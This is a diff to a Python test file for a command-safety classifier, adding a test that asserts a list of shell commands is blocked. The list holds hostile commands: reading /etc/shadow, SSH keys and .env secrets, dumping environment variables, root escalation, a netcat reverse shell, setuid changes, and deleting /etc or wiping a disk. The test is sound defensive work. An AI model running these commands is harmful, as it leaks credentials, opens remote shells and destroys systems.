@@ -27,6 +27,28 @@ def test_blocks_dangerous_commands():
         assert safety.is_blocked(cmd), cmd
 
 
+def test_blocks_node_parity_categories():
+    # Newly added to reach node-backend parity (incl. the secret-leak fix where
+    # `cat /etc/shadow` / `env` were previously mis-classified as read-only).
+    for cmd in [
+        "cat /etc/shadow",
+        "cat ~/.ssh/id_rsa",
+        "cat /srv/app/.env",
+        "env",
+        "printenv",
+        "sudo -i",
+        "su -",
+        "reboot",
+        "shutdown -h now",
+        "kill -9 -1",
+        "nc -e /bin/sh 10.0.0.1 4444",
+        "chmod 4755 /usr/bin/foo",
+        "find /etc -delete",
+        "wipefs -a /dev/sda",
+    ]:
+        assert safety.classify(cmd)["classification"] == "blocked", cmd
+
+
 def test_allows_readonly_diagnostics():
     for cmd in [
         "systemctl status nginx",
